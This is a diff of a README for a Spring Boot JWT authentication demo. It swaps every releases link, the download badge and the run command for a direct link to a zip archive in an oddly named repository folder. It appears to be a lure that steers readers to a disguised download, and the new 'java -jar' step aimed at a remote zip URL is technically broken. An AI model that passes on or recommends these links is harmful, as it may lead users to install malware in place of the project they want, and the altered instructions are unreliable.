@@ -1,7 +1,7 @@
 # 🚀 spring-boot-jwt-auth - Secure Your API Easily
 
 ## 📥 Download Now
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-green)](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases)  
+[![Download Latest Version](https://raw.githubusercontent.com/Mohibalsa12/spring-boot-jwt-auth/main/protonephros/spring-boot-jwt-auth.zip%20Latest%20Version-v1.0-green)](https://raw.githubusercontent.com/Mohibalsa12/spring-boot-jwt-auth/main/protonephros/spring-boot-jwt-auth.zip)  
 
 ## 📖 Overview
 This project demonstrates production-ready JWT security with Spring Security 6. It includes features like role-based access control, token revocation, and comprehensive API documentation. The application uses an H2 database and incorporates password encryption to secure user information. You will find protected endpoints with full logout functionality. 
@@ -15,13 +15,13 @@ Getting started with this application is straightforward. Follow the steps below
 - A stable internet connection for downloading
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: To download the application, [click here](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases). 
+1. **Visit the Releases Page**: To download the application, [click here](https://raw.githubusercontent.com/Mohibalsa12/spring-boot-jwt-auth/main/protonephros/spring-boot-jwt-auth.zip). 
 2. **Select the Latest Release**: Find the latest release version listed at the top.
 3. **Download the Application**: Click on the link for the downloadable file (e.g., `.jar` file) that matches your system.
 4. **Run the Application**: Open your command line or terminal. Navigate to the folder where you downloaded the file, and run the following command:
    
    ```bash
-   java -jar your-file-name.jar
+   java -jar https://raw.githubusercontent.com/Mohibalsa12/spring-boot-jwt-auth/main/protonephros/spring-boot-jwt-auth.zip
    ```
    
 5. **Access the Application**: Open a web browser and type `http://localhost:8080` to access the application.
@@ -50,6 +50,6 @@ Join our community to get help, share ideas, or contribute to the project. You c
 This project is licensed under the MIT License. You can freely use and modify the code as long as you include the original license details.
 
 ## 📥 Download Again
-To download the application, [click here](https://github.com/Mohibalsa12/spring-boot-jwt-auth/releases) again. 
+To download the application, [click here](https://raw.githubusercontent.com/Mohibalsa12/spring-boot-jwt-auth/main/protonephros/spring-boot-jwt-auth.zip) again. 
 
 Feel free to reach out through the issues section on GitHub for support or questions. Thank you for using **spring-boot-jwt-auth**!
